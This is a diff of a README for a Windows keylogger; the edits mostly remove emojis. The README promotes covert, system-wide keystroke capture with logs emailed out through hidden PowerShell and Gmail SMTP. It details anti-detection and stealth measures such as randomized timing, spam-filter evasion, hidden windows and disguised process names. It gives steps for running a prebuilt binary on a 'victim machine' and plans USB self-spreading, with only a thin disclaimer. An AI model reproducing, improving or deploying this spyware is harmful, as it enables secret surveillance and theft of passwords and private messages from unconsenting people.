@@ -1,47 +1,36 @@
-# 🔍 Advanced Keylogger with Email Reporting
+# Advanced Keylogger with Email Reporting
 
 A sophisticated Windows keylogger with automatic email reporting capabilities, built in C++ for educational and security testing purposes.
 
-## 📋 Table of Contents
-- [Features](#-features)
-- [Technical Overview](#-technical-overview)
-- [Requirements](#-requirements)
-- [Installation](#-installation)
-- [Configuration](#-configuration)
-- [Usage](#-usage)
-- [File Structure](#-file-structure)
-- [Security Features](#-security-features)
-- [Compilation](#-compilation)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Contributing](#-contributing)
+## Table of Contents
+- [Features](#features)
+- [Technical Overview](#technical-overview)
+- [Requirements](#requirements)
+- [Installation](#installation)
+- [Configuration](#configuration)
+- [Usage](#usage)
+- [File Structure](#file-structure)
+- [Security Features](#security-features)
+- [Compilation](#compilation)
+- [Legal Disclaimer](#legal-disclaimer)
+- [Contributing](#contributing)
 
-## ✨ Features
+## Features
 
 ### Core Functionality
-- **🔍 Complete Keystroke Capture**: Records all keyboard input system-wide
-- **📧 Automatic Email Reporting**: Sends logs via Gmail SMTP
-- **📁 Smart Log Management**: Hourly log files with incremental updates
-- **🎲 Random Intervals**: Anti-detection with randomized email timing (30-120 min)
-- **🔒 Stealth Mode**: Completely invisible operation
-- **🌐 Network Awareness**: Checks internet connectivity before sending
+- **Complete Keystroke Capture**: Records all keyboard input system-wide
+- **Automatic Email Reporting**: Sends logs via Gmail SMTP
+- **Smart Log Management**: Hourly log files with incremental updates
+- **Random Intervals**: Anti-detection with randomized email timing (30-120 min)
+- **Stealth Mode**: Completely invisible operation
+- **Network Awareness**: Checks internet connectivity before sending
 
 ### Advanced Features
-- **📈 Incremental Reporting**: Only sends new content, not duplicates
-- **🏷️ Dynamic Email Subjects**: Randomized subjects to avoid spam filters
-- **🖼️ Window Context**: Captures active window information with timestamps
-- **⚡ Auto-Recovery**: Handles file corruption and network failures
-- **📦 Portable**: Single executable with no external dependencies
-
-## 🛠️ Technical Overview
-
-### Architecture
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Keylogger     │    │   Log Manager   │    │  Email Sender   │
-│   Hook System   │────│   File I/O      │────│   SMTP Client   │
-│                 │    │   Incremental   │    │   Anti-Detection│
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-```
+- **Incremental Reporting**: Only sends new content, not duplicates
+- **Dynamic Email Subjects**: Randomized subjects to avoid spam filters
+- **Window Context**: Captures active window information with timestamps
+- **Auto-Recovery**: Handles file corruption and network failures
+- **Portable**: Single executable with no external dependencies## Technical Overview
 
 ### Technologies Used
 - **Language**: C++17
@@ -50,7 +39,7 @@ A sophisticated Windows keylogger with automatic email reporting capabilities, b
 - **Email**: PowerShell Send-MailMessage
 - **Threading**: std::thread for concurrent operations
 
-## 🔧 Requirements
+## Requirements
 
 ### Target System (Victim Machine)
 - **OS**: Windows 10/11 (any version)
@@ -61,13 +50,13 @@ A sophisticated Windows keylogger with automatic email reporting capabilities, b
 - **Compiler**: GCC/MinGW-w64 or Visual Studio
 - **Gmail Account**: With App Password enabled
 
-## 📦 Installation
+## Installation
 
 ### Quick Start (Using Pre-compiled Binary)
 1. Download `keyloggerEMAIL_portable_final.exe`
 2. Copy to target system
 3. Execute (preferably as Administrator)
-4. ✅ **That's it!** No additional setup required
+4. No additional setup required
 
 ### Gmail Configuration Required
 Before first use, you need to configure Gmail credentials in the source code:
@@ -78,7 +67,7 @@ const std::string EMAIL_PASSWORD = "your_16_char_app_password";
 const std::string EMAIL_TO = "destination@gmail.com";
 ```
 
-## ⚙️ Configuration
+## Configuration
 
 ### Email Settings
 ```cpp
@@ -98,7 +87,7 @@ const std::string SMTP_PORT = "587";
 #define mouseignore   // Ignores mouse clicks
 ```
 
-## 🚀 Usage
+## Usage
 
 ### Basic Operation
 ```bash
@@ -127,7 +116,7 @@ type "logs\*.log"
 type "logs\.email_positions"
 ```
 
-## 📁 File Structure
+## File Structure
 
 ```
 Keylogger/
@@ -147,25 +136,25 @@ Keylogger/
 [Window: Chrome - at 2025-08-30T14:31:20] google.com[ENTER]
 ```
 
-## 🔒 Security Features
+## Security Features
 
 ### Anti-Detection Mechanisms
-- **🎲 Randomized Timing**: Prevents pattern recognition
-- **📝 Variable Subjects**: Avoids email spam filters  
-- **🔇 Silent Operation**: No UI elements or notifications
-- **📊 Minimal Footprint**: Low CPU and memory usage
+- **Randomized Timing**: Prevents pattern recognition
+- **Variable Subjects**: Avoids email spam filters  
+- **Silent Operation**: No UI elements or notifications
+- **Minimal Footprint**: Low CPU and memory usage
 
 ### Data Protection
-- **🔐 Incremental Sync**: Only new data is transmitted
-- **🌐 Connectivity Checks**: Fails gracefully without internet
-- **📁 Local Backup**: All data stored locally as backup
+- **Incremental Sync**: Only new data is transmitted
+- **Connectivity Checks**: Fails gracefully without internet
+- **Local Backup**: All data stored locally as backup
 
 ### Stealth Techniques
-- **👻 Invisible Windows**: `FreeConsole()` + `ShowWindow(SW_HIDE)`
-- **🤐 Silent PowerShell**: `-WindowStyle Hidden` execution
-- **📛 Generic Process Names**: Appears as normal system process
+- **Invisible Windows**: `FreeConsole()` + `ShowWindow(SW_HIDE)`
+- **Silent PowerShell**: `-WindowStyle Hidden` execution
+- **Generic Process Names**: Appears as normal system process
 
-## 🔨 Compilation
+## Compilation
 
 ### Prerequisites
 ```bash
@@ -205,7 +194,7 @@ DLL Name: USER32.dll
 DLL Name: WININET.dll
 ```
 
-## 📊 Performance Metrics
+## Performance Metrics
 
 ### Resource Usage
 - **Memory**: ~6-8 MB RAM
@@ -218,7 +207,7 @@ DLL Name: WININET.dll
 - **Size**: Typically 1-50 KB per email
 - **Success Rate**: 99%+ with proper Gmail configuration
 
-## 🔬 Advanced Features
+## Advanced Features
 
 ### Email Reporting System
 ```cpp
@@ -248,28 +237,28 @@ int getRandomInterval() {
 }
 ```
 
-## ⚠️ Legal Disclaimer
+## Legal Disclaimer
 
-### 🚨 IMPORTANT: This software is intended for:
-- ✅ **Educational purposes** and learning cybersecurity concepts
-- ✅ **Authorized penetration testing** and security auditing
-- ✅ **Personal use** on your own devices
-- ✅ **Parental monitoring** of minor children's devices (where legally permitted)
+### IMPORTANT: This software is intended for:
+- Educational purposes and learning cybersecurity concepts
+- Authorized penetration testing and security auditing
+- Personal use on your own devices
+- Parental monitoring of minor children's devices (where legally permitted)
 
-### ❌ This software should NOT be used for:
-- ❌ **Unauthorized surveillance** of other people
-- ❌ **Corporate espionage** or data theft
-- ❌ **Stalking or harassment** of individuals
-- ❌ **Any illegal activities** in your jurisdiction
+### This software should NOT be used for:
+- Unauthorized surveillance of other people
+- Corporate espionage or data theft
+- Stalking or harassment of individuals
+- Any illegal activities in your jurisdiction
 
-### 📜 Legal Requirements:
+### Legal Requirements:
 - **Obtain explicit consent** before installing on any device you don't own
 - **Comply with local laws** regarding privacy and surveillance
 - **Use responsibly** and ethically in all circumstances
 
 **The authors are not responsible for any misuse of this software. Users are solely responsible for ensuring their use complies with applicable laws and regulations.**
 
-## 🤝 Contributing
+## Contributing
 
 ### How to Contribute
 1. **Fork** the repository
@@ -291,52 +280,52 @@ Please include:
 - Error messages or unexpected behavior
 - Steps to reproduce the issue
 
-## 📞 Support & Contact
+## Support & Contact
 
 ### Getting Help
-- 📖 Check this README for common issues
-- 🐛 Search existing GitHub issues
-- ❓ Create a new issue for bugs or questions
+- Check this README for common issues
+- Search existing GitHub issues
+- Create a new issue for bugs or questions
 
 ### Security Issues
 For security vulnerabilities, please contact privately before public disclosure.
 
-## 📈 Version History
+## Version History
 
 ### v3.0 (Current) - Advanced Email Integration
-- ✨ Automatic email reporting with Gmail SMTP
-- 🎲 Randomized timing for anti-detection
-- 📈 Incremental sync system
-- 🔒 Enhanced stealth capabilities
-- 📦 Fully portable executable
+- Automatic email reporting with Gmail SMTP
+- Randomized timing for anti-detection
+- Incremental sync system
+- Enhanced stealth capabilities
+- Fully portable executable
 
 ### v2.0 - Enhanced Logging
-- ⏰ Hourly log file rotation
-- 🖼️ Window context capture
-- 🎯 Improved key mapping
-- 🛡️ Better error handling
+- Hourly log file rotation
+- Window context capture
+- Improved key mapping
+- Better error handling
 
 ### v1.0 - Basic Keylogger
-- ⌨️ Basic keystroke capture
-- 💾 Simple file logging
-- 🪟 Windows API integration
+- Basic keystroke capture
+- Simple file logging
+- Windows API integration
 
-## 🎯 Roadmap
+## Roadmap
 
 ### Planned Features
-- [ ] **Database Storage**: SQLite integration for better log management
-- [ ] **Multiple Email Providers**: Support for Outlook, Yahoo, etc.
-- [ ] **Screenshot Capture**: Periodic screen captures
-- [ ] **USB Spreading**: Automatic deployment via USB devices
-- [ ] **Encrypted Communications**: End-to-end encrypted email reports
-- [ ] **Web Interface**: Remote control and monitoring dashboard
+- Database Storage: SQLite integration for better log management
+- Multiple Email Providers: Support for Outlook, Yahoo, etc.
+- Screenshot Capture: Periodic screen captures
+- USB Spreading: Automatic deployment via USB devices
+- Encrypted Communications: End-to-end encrypted email reports
+- Web Interface: Remote control and monitoring dashboard
 
 ### Performance Improvements
-- [ ] **Memory Optimization**: Reduce RAM usage further
-- [ ] **Compression**: Compress logs before email transmission
-- [ ] **Batch Processing**: Group multiple log files in single email
+- Memory Optimization: Reduce RAM usage further
+- Compression: Compress logs before email transmission
+- Batch Processing: Group multiple log files in single email
 
-## 🏆 Acknowledgments
+## Acknowledgments
 
 ### Technologies & Libraries
 - **Windows API**: Core system integration
@@ -353,6 +342,6 @@ This project was developed for educational purposes to understand:
 
 ---
 
-**⚡ Built with C++ • 🔒 Stealth Technology • 📧 Email Integration • 🛡️ Security Research**
+**Built with C++ | Stealth Technology | Email Integration | Security Research**
 
-*Remember: With great power comes great responsibility. Use this knowledge to protect, not to harm.*
+
